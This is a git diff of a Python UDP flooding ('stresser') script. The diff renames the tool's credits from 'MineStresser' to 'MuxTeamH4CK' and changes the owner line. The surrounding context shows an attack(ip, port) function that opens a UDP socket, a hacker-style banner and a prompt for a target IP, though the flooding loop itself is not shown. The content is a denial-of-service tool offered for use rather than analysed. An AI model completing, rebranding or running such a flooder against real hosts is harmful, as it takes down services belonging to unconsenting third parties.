@@ -6,7 +6,7 @@ import random
 import threading
 import sys
 
-# Coding MineStresser
+# Coding MuxTeamH4CK
 # Attack
 def attack(ip, port):
   s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -17,7 +17,7 @@ def attack(ip, port):
 # VPS
 os.system("pyfiglet --color=RED MuxTeamH4CK")
 print("\033[92m")
-print("Staff: @MineGamerST")
+print("Owner: ItzMuxGamer")
 print(" ")
 time.sleep(0)
 ip = input("IP: ")
